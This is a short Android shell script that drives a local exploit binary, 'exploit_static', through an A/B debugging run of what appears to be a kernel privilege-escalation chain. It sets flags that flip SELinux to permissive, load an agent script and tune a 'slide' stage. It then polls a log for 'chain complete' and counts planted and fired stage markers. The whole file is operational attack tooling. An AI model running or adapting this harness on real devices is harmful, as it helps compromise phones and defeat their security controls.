#!/system/bin/sh
# A/B control: identical binary, but SLIDE_D1_TRACE=1 restores the pre-fire
# O_SYNC write (the D1 line). If the pre-fire sync is the C1-fire killer,
# these runs crash again while the no-D1 runs succeed.
D=/data/local/tmp
LOG=$D/run.log
cd $D || exit 1
rm -f $LOG
( DURABLE_LOG=$LOG FLIP_PERMISSIVE=1 NO_RSCAN=1 KSU_LOADER=0 \
  AGENT_SCRIPT=$D/dump_logs.sh SYSCTL_WALK_ATTEMPTS=1 SLIDE_SELFCONTAINED=1 \
  SLIDE_SIGNAL_WAKE=1 SLIDE_WAIT_SECS=0 SLIDE_SIGRET_BUF_BYTE=0x10 \
  SLIDE_NO_RESTORE=1 KS_MAX_TRIES=1 SLIDE_NOKILL=1 SLIDE_D1_TRACE=1 \
  ./exploit_static > /dev/null 2>&1 & )
n=0
while [ $n -lt 45 ]; do
  grep -q 'chain complete' $LOG 2>/dev/null && break
  sleep 2; n=$((n+1))
done
echo "--- run.log tail ---"
tail -6 $LOG 2>&1
echo "--- markers ---"
echo "D1=$(grep -c 'D1 ' $LOG 2>/dev/null) plants=$(grep -c 'W3p planted' $LOG 2>/dev/null) fired=$(grep -c 'C2 fired' $LOG 2>/dev/null)"
